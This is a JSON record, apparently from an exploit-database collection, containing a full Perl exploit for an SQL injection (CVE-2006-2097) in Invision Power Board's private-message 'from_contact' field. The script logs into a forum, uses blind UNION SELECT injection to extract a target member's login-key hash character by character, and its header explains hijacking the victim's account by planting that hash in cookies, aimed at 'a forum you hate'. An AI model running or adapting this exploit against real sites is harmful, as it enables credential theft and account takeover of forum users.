{
  "id": "1733",
  "title": "Invision Power Board 2.1.5 - &#039;from_contact&#039; SQL Injection",
  "cve": "CVE-2006-2097",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#############################################################################\r\n## IPB <=2.1.4 exploit (possibly 2.1.5 too)                                ##\r\n## Brought to you by the Ykstortion security team.                         ##\r\n##                                                                         ##\r\n## The bug is in the pm system so you must have a registered user.         ##\r\n## The exploit will extract a password hash from the forum's data base of  ##\r\n## the target user.                                                        ##\r\n## You need to know the target user's member ID but it's not difficult to  ##\r\n## find out, just look under their avatar next to one of their posts.      ##\r\n## Once you have the hash, simply unset all forum cookies and set          ##\r\n## member_id to the target user's member id and pass_hash to the hash      ##\r\n## obtained from the database by this script.                              ##\r\n##                                                                         ##\r\n## Usage:                                                                  ##\r\n##   $ ./ipb                                                               ##\r\n##   IPB Forum URL ? forums.example.com/forums                             ##\r\n##   Your username ? krypt_sk1dd13                                         ##\r\n##   Your pass ? if_your_on_nix_this_gets_hidden                           ##\r\n##   Target userid ? 3637                                                  ##\r\n##                                                                         ##\r\n##   Attempting to extract password hash from database...                  ##\r\n##   537ab2d5b37ac3a3632f5d06e8e04368                                      ##\r\n##   Hit enter to quit.                                                    ##\r\n##                                                                         ##\r\n## Requirements:                                                           ##\r\n##   o Perl 5                                                              ##\r\n##   o LWP 5.64 or later                                                   ##\r\n##   o Internet access                                                     ##\r\n##   o A forum you hate/dislike                                            ##\r\n##   o A user on said forum                                                ##\r\n##   o 32+ PMs left till your inbox is full, if not you can still delete   ##\r\n##     PMs from your inbox as the successful ones come through             ##\r\n##                                                                         ##\r\n## Credit to: Nuticulus for finding the SQL injection                      ##\r\n##                                                                         ##\r\n## Have fun, you dumb skiddie.                                             ##\r\n#############################################################################\r\n\r\nuse HTTP::Cookies;\r\nuse LWP 5.64;\r\nuse HTTP::Request;\r\n\r\n# variables\r\nmy $login_page = '?act=Login&CODE=01';\r\nmy $pm_page = '?act=Msg&CODE=04';\r\nmy $pose_pm_page = '?';\r\nmy $tries = 5;\r\nmy $sql = '';\r\nmy $hash = '';\r\nmy $need_null = 0;\r\nmy $i;\r\nmy $j;\r\nmy @charset = ('0' .. '9', 'a' .. 'f');\r\nmy %form = (act\t\t=> 'Msg',\r\n\tCODE\t\t=> '04',\r\n\tMODE\t\t=> '01',\r\n\tOID\t\t=> '',\r\n\tremoveattachid\t=> '',\r\n\tmsg_title\t=> 'asdf',\r\n\tbbmode\t\t=> 'normal',\r\n\tffont\t\t=> 0,\r\n\tfsize\t\t=> 0,\r\n\tfcolor\t\t=> 0,\r\n\tLIST\t\t=> ' LIST ',\r\n\thelpbox\t\t=> 'Insert Monotype Text (alt + p)',\r\n\ttagcount\t=> 0,\r\n\tPost\t\t=> 'jkl');\r\n\t\r\n\r\n# objects\r\nmy $ua = LWP::UserAgent->new;\r\nmy $cj = HTTP::Cookies->new (file => \"N/A\", autosave => 0);\r\nmy $resp;\r\n\r\n# init the cookie jar\r\n$ua->cookie_jar ($cj);\r\n\r\n# allow redirects on post requests\r\npush @{ $ua->requests_redirectable }, \"POST\";\r\n\r\n# get user input\r\nprint 'IPB Forum URL ? ';\r\nchomp (my $base_url = <STDIN>);\r\nprint 'Your username ? ';\r\nchomp (my $user = <STDIN>);\r\n$form{entered_name} = $user;\r\nprint 'Your pass ? ';\r\n# systems without stty will error otherwise\r\nmy $stty = -x '/bin/stty';\r\nsystem 'stty -echo' if $stty;\t\t# to turn off echoing\r\nchomp (my $pass = <STDIN>);\r\nsystem 'stty echo' if $stty;\t\t# to turn it back on\r\nprint \"\\n\" if $stty;\r\nprint 'Target userid ? ';\t# it'll say next to one of their posts\r\nchomp (my $tid = <STDIN>);\r\n\r\n# parse the given base url\r\nif ($base_url !~ m#^http://#) { $base_url = 'http://' . $base_url }\r\nif ($base_url !~ m#/$|index\\.php$#) { $base_url .= '/' }\r\n\r\ndo {\r\n\t$resp = $ua->post ($base_url . $login_page,\r\n\t\t[ UserName => $user,\r\n\t\t  PassWord => $pass,\r\n\t\t  CookieDate => 1,\r\n\t\t]);\r\n} while ($tries-- && !$resp->is_success());\r\n\r\n# reset tries\r\n$tries = 5;\r\n\r\n# did we get 200 (OK) ?\r\nif (!$resp->is_success()) { die 'Error: ' . $resp->status_line . \"\\n\" }\r\n\r\n# was the pass right ?\r\nif ($resp->content =~ /sorry, the password was wrong/i) {\r\n\tdie \"Error: password incorrect.\\n\";\r\n}\r\n\r\n# get ourselves a post_key (and an auth_key too with newer versions)\r\ndo {\r\n\t$resp = $ua->get ($base_url . $pm_page);\r\n} while ($tries-- && !$resp->is_success());\r\n\r\n# reset tries\r\n$tries = 5;\r\n\r\nif (!$resp->is_success()) { die 'Error: ' . $resp->status_line . \"\\n\" }\r\nif ($resp->content =~ m#<input\\s+?type=[\"']?hidden[\"']?\\s+?name=[\"']?post_key[\"']?\\s+?value=[\"']?([0-9a-f]{32})[\"']?\\s+?/>#)\r\n{\r\n\t$form{post_key} = $1;\r\n} else {\r\n\tdie \"Error: couldn't get a post key.\\n\";\r\n}\r\nif ($resp->content =~ m#<input\\s+?type=[\"']?hidden[\"']?\\s+?name=[\"']?auth_key[\"']?\\s+?value=[\"']?([0-9a-f]{32})[\"']?\\s+/>#)\r\n{\r\n\t$form{auth_key} = $1;\r\n}\r\n\r\n# turn off buffering so chars in the hash show up straight away\r\n$| = 1;\r\n\r\nprint \"\\nAttempting to extract password hash from database...\\n \";\r\n\r\nOFFSET:\r\nfor ($i = 0; $i < 32; ++$i) {\r\n\tCHAR:\r\n\tfor ($j = 0; $j < @charset; ++$j) {\r\n\t\t# reset tries\r\n\t\t$tries = 5;\r\n\t\tprint \"\\x08\", $charset[$j];\r\n\t\t# build sql injection\r\n\t\t$sql = '-1 UNION SELECT ' . ($need_null ? '0, ' : '') . 'CHAR('\r\n\t\t     . (join (',', map {ord} split ('', $user))) . ') FROM '\r\n\t\t     . 'ibf_members WHERE id = ' . $tid . ' AND MID('\r\n\t\t     . 'member_login_key, ' . ($i + 1) . ', 1) = CHAR('\r\n\t\t     . ord ($charset[$j]) . ')';\r\n\t\t$form{from_contact} = $sql;\r\n\t\t$resp = $ua->post ($base_url . $post_pm_page, \\%form,\r\n\t\t\treferer => $base_url . $pm_page);\r\n\t\tif (!$resp->is_success()) {\r\n\t\t\tdie \"\\nError: \" . $resp->status_line\r\n\t\t\t  . \"\\n\" if (!$tries);\r\n\t\t\t--$tries;\r\n\t\t\tredo;\r\n\t\t}\r\n\t\tif ($resp->content =~ /sql error/i) {\r\n\t\t\tif ($need_null) {\r\n\t\t\t\tdie \"Error: SQL error.\\n\";\r\n\t\t\t} else {\r\n\t\t\t\t$need_null = 1;\r\n\t\t\t\tredo OFFSET;\r\n\t\t\t}\r\n\t\t} elsif ($resp->content !~ /there is no such member/i) {\r\n\t\t\t# we have a winner !\r\n\t\t\tprint ' ';\r\n\t\t\tnext OFFSET;\r\n\t\t}\r\n\t}\r\n\t# uh oh, something went wrong\r\n\tdie \"\\nError: couldn't get a char for offset $i\\n\";\r\n}\r\nprint \"\\x08 \\x08\\nHit enter to quit.\\n\";\r\n<STDIN>;\r\n\r\n# milw0rm.com [2006-05-01]",
  "url": "https://www.exploit-db.com/exploits/1733"
}